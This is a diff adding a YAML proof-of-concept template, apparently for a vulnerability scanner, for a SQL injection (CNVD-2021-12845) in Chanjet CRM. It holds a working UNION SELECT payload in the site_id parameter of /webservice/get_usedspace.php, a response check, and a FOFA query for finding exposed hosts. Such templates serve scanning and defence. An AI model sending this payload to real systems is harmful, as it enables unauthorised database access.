@@ -1,0 +1,18 @@
+id: poc-yaml-changjie-crm-sqli-cnvd-2021-12845
+info:
+  name: 畅捷通CRM SQL注入漏洞(CNVD-2021-12845)
+  severity: high
+  tags:
+  - 两高一弱
+  - sql-injection
+  - CNVD-2021-12845
+  finger: 畅捷通CRM
+  fofa: app="畅捷通-畅捷CRM"
+variables:
+  t1: random_int(1000,10000)
+  t2: md5(t1)
+requests:
+- method: GET
+  path: /webservice/get_usedspace.php?site_id=-1%20and%201=2%20union%20all%20select%20(md5({{.t1}}))
+  expression: status_code == 200 && contains(body,"<result>" + t2 + "</result>")
+transport: http
